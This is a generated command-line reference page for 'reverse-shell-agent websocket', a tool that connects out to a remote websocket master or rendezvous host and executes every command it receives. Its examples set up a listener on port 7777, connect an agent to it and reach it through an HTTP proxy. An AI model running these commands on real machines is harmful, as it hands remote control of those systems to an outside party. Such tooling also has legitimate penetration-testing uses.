## reverse-shell-agent websocket

Agent that connects to a websocket endpoints and wait for commands

### Synopsis

Connect to a remote websocket and execute every command received. The remote host can be a `master` or a `rendezvous`.

```
reverse-shell-agent websocket [flags]
```

### Examples

```
# On the master (1.2.3.4)
$ reverse-shell-client listen --port 7777

# On the agent
$ reverse-shell-agent websocket --url http://1.2.3.4:7777

Once an agent connects, you will be able to write commands in *stdin* that will be directly executed on the agent. You can also connect to a rendezvous point instead of a master.

You can also connect to the outside using a proxy:
$ http_proxy=http://your-proxy:3128 https_proxy=http://your-proxy:3128 agent websocket -U http://1.2.3.4:7777

```

### Options

```
  -h, --help         help for websocket
      --url string   url of the remote websocket endpoint
```

### Options inherited from parent commands

```
  -v, --verbose int   Be verbose on log output
```

### SEE ALSO

* [reverse-shell-agent](reverse-shell-agent.md)	 - Agents listening for remote commands

